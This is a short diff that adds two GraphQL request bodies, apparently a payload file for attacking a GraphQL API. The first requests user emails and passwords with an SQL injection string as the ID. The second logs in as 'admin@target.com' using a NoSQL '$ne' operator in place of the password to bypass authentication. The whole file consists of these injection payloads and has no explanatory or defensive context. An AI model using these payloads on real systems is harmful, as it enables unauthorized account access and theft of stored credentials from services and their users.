@@ -1,0 +1,8 @@
+{
+  "query": "query getUser($id: ID!) { user(id: $id) { id email password } }",
+  "variables": { "id": "' OR '1'='1" }
+}
+{
+  "query": "mutation login($email: String!, $password: String!) { login(email: $email, password: $password) { token } }",
+  "variables": { "email": "admin@target.com", "password": {"$ne": null} }
+}
